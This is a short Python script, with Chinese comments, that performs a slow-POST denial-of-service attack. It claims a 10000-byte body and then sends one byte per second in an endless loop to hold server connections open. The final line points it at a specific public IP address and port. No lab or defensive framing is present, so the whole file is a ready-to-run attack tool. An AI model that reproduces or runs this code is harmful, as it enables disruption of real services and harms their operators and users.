import http.client
import time

def slow_attack(host, port, path):
    while True:  # 无限循环
        try:
            conn = http.client.HTTPConnection(host, port)
            headers = {"Content-Length": "10000"}  # 声明我们将要发送的内容长度
            conn.putrequest("POST", path)
            for header, value in headers.items():
                conn.putheader(header, value)
            conn.endheaders()

            # 每秒发送一个字节
            for i in range(10000):
                conn.send(b"a")
                time.sleep(1)  # 暂停一秒

        except ConnectionResetError:
            print("Connection reset by peer")
        except KeyboardInterrupt:
            print("Interrupted by user")
            break  # 如果用户按下Ctrl+C，跳出无限循环
        except Exception as e:
            print(f"Unexpected error: {e}")
        finally:
            # 关闭连接
            conn.close()

slow_attack("8.131.101.60", 8888, "/")
